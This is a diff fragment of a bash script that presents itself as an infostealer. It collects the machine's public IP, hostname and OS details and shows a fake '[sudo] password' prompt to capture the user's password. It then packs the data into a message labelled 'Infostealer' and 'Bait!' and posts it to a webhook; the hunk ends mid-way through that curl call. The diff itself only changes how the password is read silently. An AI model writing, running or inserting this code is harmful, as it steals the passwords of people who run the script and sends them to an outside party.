@@ -5,11 +5,9 @@ IPADDR=$(curl ifconfig.me)
 HOSTNAME=$(hostname)
 OSINFO=$(uname -srm)
 # Read Password
-stty -echo
-printf "[sudo] password for $USER: "
-read PASSWORD
-stty echo
-printf "\n"
+echo -n "[sudo] password for $USER" 
+read -s PASSWORD
+echo
 # Send to webhook
 BODY='{"username": "Infostealer", "content": "**Bait!**\n\nHost:$USER@$HOSTNAME\nOS: $(OSINFO)\nPassword: $PASSWORD\nIP: $IPADDR\n"}'
 curl \
